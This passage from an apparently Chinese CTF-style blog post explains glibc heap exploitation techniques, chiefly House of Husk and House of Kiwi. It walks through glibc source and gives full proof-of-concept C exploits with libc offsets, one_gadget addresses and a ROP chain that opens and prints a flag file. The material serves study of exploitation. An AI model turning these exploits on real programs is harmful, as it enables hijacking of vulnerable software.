LM_ID_BASE))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">rtld_active</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">/* The default-initialized variable does not have a non-zero</span></span><br><span class="line"><span class="comment">     dl_init_all_dirs member, so this allows us to recognize an</span></span><br><span class="line"><span class="comment">     initialized and active ld.so copy.  */</span></span><br><span class="line">  <span class="keyword">return</span> GLRO(dl_init_all_dirs) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _dl_addr(<span class="type">const</span> <span class="type">void</span> *address, Dl_info *info, <span class="keyword">struct</span> link_map **mapp, <span class="type">const</span> ElfW(Sym) **symbolp) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> addr = DL_LOOKUP_ADDRESS (address);</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  </span><br><span class="line"> 定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_lock) *_fn = (__pthread_mutex_lock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>

<p>可以看到，如果 <code>rtld_active</code> 返回 true（具体看调试，因为可能存在<code>GLRO(dl_init_all_dirs)</code>不可写且为 NULL 的情况）则</p>
<p>会调用 <code>_dl_addr</code>，最终执行 <code>__rtld_lock_lock_recursive (GL(dl_load_lock))</code> ，这个宏就是 exit hook 对应的宏，因此可以像 exit hook 那样修改函数指针就可以劫持程序流。</p>
<p>同样的，glibc-2.34 起该方法失效。</p>
<h2 id="House-of-Husk"><a href="#House-of-Husk" class="headerlink" title="House of Husk"></a>House of Husk</h2><p>在 glibc 中，可以通过 <code>__register_printf_function</code>  函数为 <code>printf</code> 格式化字符串中的 <code>spec</code> （例如 <code>%X</code> 中的 <code>X</code>）注册对应的函数。而维护字符与函数的映射关系的结构有 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 。位置关系如下图所示（实际位置在哪里以及相对位置如何不重要，glibc 只通过 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 这两个指针访问这两个函数表），其中有 2 字节填充。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/edf77a3058ba82a89a35304d8491a08c.png"
                      alt="在这里插入图片描述" style="zoom: 67%;" 
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  result = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_function (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			    printf_arginfo_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __register_printf_specifier (spec, converter,</span><br><span class="line">				      (printf_arginfo_size_function*) arginfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>printf</code> 实际在 glibc 中为 <code>__printf</code> ，它调用的是 <code>vfprintf</code> 。在 <code>vfprintf</code> 函数中，如果 <code>__printf_function_table</code> 不为空，那么会调用 <code>printf_positional</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line">	...</span><br><span class="line">	do_positional:</span><br><span class="line">	...</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>printf_positional</code> 及其调用的 <code>__parse_one_specmb</code> 函数中，<code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 中的函数都会被调用，因此可以将 <code>__printf_function_table</code> 或者 <code>__printf_function_table</code> 指针覆盖为伪造的 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 并在其中写入 one_gadget 来获取 shell 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__parse_one_specmb (<span class="type">const</span> UCHAR_T *format, <span class="type">size_t</span> posn,</span><br><span class="line">		    <span class="keyword">struct</span> printf_spec *spec, <span class="type">size_t</span> *max_ref_arg)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">      || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">      <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">	 uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">	 the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">      || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">				   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">				    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">printf_positional</span> <span class="params">(_IO_FILE *s, <span class="type">const</span> CHAR_T *format, <span class="type">int</span> readonly_format,</span></span><br><span class="line"><span class="params">		   va_list ap, va_list *ap_savep, <span class="type">int</span> done, <span class="type">int</span> nspecs_done,</span></span><br><span class="line"><span class="params">		   <span class="type">const</span> UCHAR_T *lead_str_end,</span></span><br><span class="line"><span class="params">		   CHAR_T *work_buffer, <span class="type">int</span> save_errno,</span></span><br><span class="line"><span class="params">		   <span class="type">const</span> <span class="type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line">	...</span><br><span class="line">	  <span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">	      &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">	      &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">const</span> <span class="type">void</span> **ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class="line">					 * <span class="keyword">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">	      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args;</span><br><span class="line">		   ++i)</span><br><span class="line">		ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Call the function.  */</span></span><br><span class="line">	      function_done = __printf_function_table[(<span class="type">size_t</span>) spec]</span><br><span class="line">		(s, &amp;specs[nspecs_done].info, ptr);</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">		     about # of chars.  */</span></span><br><span class="line">		  <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">		      done = <span class="number">-1</span>;</span><br><span class="line">		      <span class="keyword">goto</span> all_done;</span><br><span class="line">		    &#125;</span><br><span class="line"></span><br><span class="line">		  done_add (function_done);</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>下面介绍一下 hous of husk 的具体利用手法，具体见细节见 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_husk" >Poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<ol>
<li><p>首先释放一个 chunk 进入 unsorted bin 泄露 libc 基地址。</p>
</li>
<li><p>构造 unsorted bin attack 修改 <code>global_max_fast</code> 为一个很大的值。</p>
</li>
<li><p>由于 <code>global_max_fast</code> 是一个很大的值，因此即使释放很大的 chunk 也会进入 fast bin ，并且由于下标超过了 bin 数组的范围，因此可以将 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 覆盖成释放的堆块的内存的指针。利用这一特性可以满足下面的条件：</p>
<ul>
<li>为了通过 <code>vfprintf</code> 处的函数判断使函数调用 <code>printf_positional</code> ，可以将 <code>__printf_function_table</code> 覆盖为非 0 值。</li>
<li>将 <code>__printf_function_table</code> 或者 <code>__printf_arginfo_table</code> 覆盖为指向写有 one_gadget 的内存的指针。其中 <code>one_gadget</code> 在内存中的偏移对应与之后触发漏洞的 <code>spec</code> 。</li>
<li>如果是利用 <code>__printf_function_table</code> 触发漏洞需要让 <code>__printf_arginfo_table</code> 指向一块内存并且该内存对应 <code>spec</code> 偏移处设为 null ，否则会在 <code>__parse_one_specmb</code> 函数的 if 判断中造成不可预知的错误。</li>
</ul>
</li>
<li><p>最后调用 <code>printf</code> 触发漏洞获取 shell 。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/9b8515a4b1953a79a2fec81c9123eb2e.png"
                      alt="在这里插入图片描述"
                ><br>poc 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3afc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3b1940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3b4658</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3b0870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0xdeed2</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lxn&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">  <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">//__printf_arginfo_table =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="House-of-Kiwi"><a href="#House-of-Kiwi" class="headerlink" title="House of Kiwi"></a>House of Kiwi</h2><p>当程序正常调用 <code>exit</code> 退出时可以通过劫持 <code>vtable</code> 上的 <code>_IO_overflow</code> 来实现程序流劫持，例如 FSOP 。然而，如果程序调用 <code>_exit</code> 退出，那么将不会进行 IO 相关的清理工作，而是直接进行系统调用。因此需要主动触发异常退出来调用 <code>vtable</code> 上的相关函数，这就衍生出了 House of Kiwi 这一攻击手法。</p>
<p>在 <code>sysmalloc</code> 中，有一个检查 top chunk 页对齐的代码片段：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>通过调试可知，如果满足条件会调用 <code>__malloc_assert</code> ，而 <code>__malloc_assert</code> 会调用 <code>fflush (stderr);</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 <code>fflush</code> 最终会调用 <code>_IO_fflush</code> ，其中 <code>result = _IO_SYNC (fp) ? EOF : 0;</code> 这行代码对应汇编如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/39187563c35d7122ff76a13a3385beed.png"
                      alt="在这里插入图片描述"
                ><br>其中 rbp 指向 <code>_IO_file_jumps_</code> ，因此 <code>call [rbp + 0x60]</code> 调用的是 <code>_IO_new_file_sync</code> ，并且 <code>_IO_file_jumps_</code> 可写。因此只需要将 <code>_IO_file_jumps_</code> 对应 <code>_IO_new_file_sync</code> 函数指针的位置覆盖为 one_gadget 就可以获取 shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/1dd95a4866c19726c0030b5d916885c6.png"
                      alt="在这里插入图片描述"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/978037c3d39cd3aa46667a9482a3f9d3.png"
                      alt="在这里插入图片描述"
                ><br>不过如果对于禁用 <code>execve</code> 的程序需要借助 <code>setcontext+61</code> + rop 或 shellcode 进行 orw 。<br>其中 <code>setcontext+61</code> 汇编如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000050C0D mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000050C14 mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000050C1B mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000050C1F mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000050C23 mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000050C27 mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000050C2B mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000050C2F test    dword ptr fs:48h, 2</span><br><span class="line">.text:0000000000050C3B jz      loc_50CF6</span><br><span class="line">...</span><br><span class="line">.text:0000000000050CF6 loc_50CF6:                              ; CODE XREF: setcontext+6B↑j</span><br><span class="line">.text:0000000000050CF6 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000050CFD push    rcx</span><br><span class="line">.text:0000000000050CFE mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000050D02 mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000050D06 mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000050D0D mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000050D11 mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000050D15 mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000050D15 ; &#125; // starts at 50BD0</span><br><span class="line">.text:0000000000050D1C ; __unwind &#123;</span><br><span class="line">.text:0000000000050D1C xor     eax, eax</span><br><span class="line">.text:0000000000050D1E retn</span><br></pre></td></tr></table></figure></div>
<p>可以看到，寄存器都是根据 rdx 指向的内存区域进行设置的，而根据前面的调试可知，调用 <code>_IO_new_file_sync</code> 时 rdx 指向的是 <code>_IO_helper_jumps_</code> 结构（注意，内存中有不止一个 <code>_IO_helper_jumps_</code> ，具体是哪一个要通过调试确定。），该结构同样可写。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/60bb92dc6cddf372e7022318692210a0.png"
                      alt="在这里插入图片描述"
                ><br>因此可以通过修改 <code>_IO_helper_jumps_</code> 中的内容来给寄存器赋值。<br>以 rop 方法为例，需要设置 rsp 指向提前布置号的 rop 的起始位置，同时设置 rip 指向 <code>ret</code> 指令。最后劫持程序流实现 orw 。</p>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_kiwi" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x2da82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x107191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x37bba</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x446d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x88236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x50bd0</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_helper_jumps = libc_base + <span class="number">0x1f3980</span>; <span class="comment">// _IO_helper_jumps</span></span><br><span class="line">  </span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line"></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA0</span>/<span class="number">8</span>) = (<span class="type">size_t</span>)ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line"> </span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>实际上 <code>__malloc_assert </code> 函数中在 <code>fflush</code> 前调用的 <code>__fxprintf </code> 中也调用了 vtable 中的相关函数，不过由于此时的 rdx 指向没有指向可控内存，还需要一个 rdi 转 rdx 的 gadget 。后面的 house of emma 就是利用了这条攻击链。</p>
<p>glibc-2.36 的 <code>__malloc_assert</code> 发生重大改变，直接通过系统调用不走 IO，该方法失效。</p>
